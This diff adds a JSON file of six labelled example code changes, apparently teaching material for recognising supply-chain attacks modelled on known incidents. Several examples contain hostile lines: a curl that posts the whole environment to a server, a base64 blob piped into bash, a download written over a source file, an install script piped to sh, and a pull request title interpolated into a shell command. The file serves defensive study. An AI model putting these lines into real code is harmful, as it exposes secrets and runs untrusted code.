@@ -1,0 +1,38 @@
+[
+ {
+  "id": "download-over-source",
+  "title": "A build script writes a download over a source file",
+  "note": "Shaped like the Amazon Q extension incident (version 1.84.0). Written for this page; the address is a reserved name that never resolves.",
+  "diff": "diff --git a/scripts/package.ts b/scripts/package.ts\nindex 1111111..2222222 100644\n--- a/scripts/package.ts\n+++ b/scripts/package.ts\n@@ -140,2 +140,4 @@\n     const target = path.join(root, \"src\", \"lsp.ts\")\n+    const res = await fetch(\"https://example.invalid/update/lsp.ts\")\n+    await fs.promises.writeFile(\"src/lsp.ts\", await res.text())\n     run(\"npm\", [\"run\", \"build\"])\n"
+ },
+ {
+  "id": "pr-title-in-workflow",
+  "title": "A workflow pastes a pull request title into a shell line",
+  "note": "Shaped like the Nx workflow incident (August 2025).",
+  "diff": "diff --git a/.github/workflows/triage.yml b/.github/workflows/triage.yml\nindex 1111111..2222222 100644\n--- a/.github/workflows/triage.yml\n+++ b/.github/workflows/triage.yml\n@@ -12,2 +12,3 @@\n       - name: Say hello\n+        run: echo \"New pull request: ${{ github.event.pull_request.title }}\"\n       - uses: actions/checkout@v4\n"
+ },
+ {
+  "id": "decode-and-run",
+  "title": "A release step decodes a blob and runs it",
+  "note": "Shaped like the tj-actions and reviewdog payloads.",
+  "diff": "diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml\nindex 1111111..2222222 100644\n--- a/.github/workflows/release.yml\n+++ b/.github/workflows/release.yml\n@@ -30,2 +30,3 @@\n       - name: Publish\n+        run: echo \"$BLOB\" | base64 -d | bash\n         env:\n"
+ },
+ {
+  "id": "environment-to-server",
+  "title": "A script posts the whole environment to a server",
+  "note": "Shaped like the Codecov bash uploader incident.",
+  "diff": "diff --git a/scripts/upload.sh b/scripts/upload.sh\nindex 1111111..2222222 100644\n--- a/scripts/upload.sh\n+++ b/scripts/upload.sh\n@@ -5,2 +5,3 @@\n set -e\n+curl -s -X POST --data \"$(env)\" https://example.invalid/collect\n echo done\n"
+ },
+ {
+  "id": "moving-references",
+  "title": "An image tagged latest and a download piped into a shell",
+  "note": "Not an attack: things that can change under you.",
+  "diff": "diff --git a/Dockerfile b/Dockerfile\nindex 1111111..2222222 100644\n--- a/Dockerfile\n+++ b/Dockerfile\n@@ -1,2 +1,4 @@\n # build image\n+FROM node:latest\n+RUN curl -fsSL https://example.invalid/install.sh | sh\n WORKDIR /app\n"
+ },
+ {
+  "id": "ordinary",
+  "title": "An ordinary change",
+  "note": "Nothing here is named. That is not a statement that the change is fine.",
+  "diff": "diff --git a/src/greet.py b/src/greet.py\nindex 1111111..2222222 100644\n--- a/src/greet.py\n+++ b/src/greet.py\n@@ -1,2 +1,3 @@\n def greet(name):\n+    name = name.strip()\n     return f\"Hello, {name}\"\n"
+ }
+]
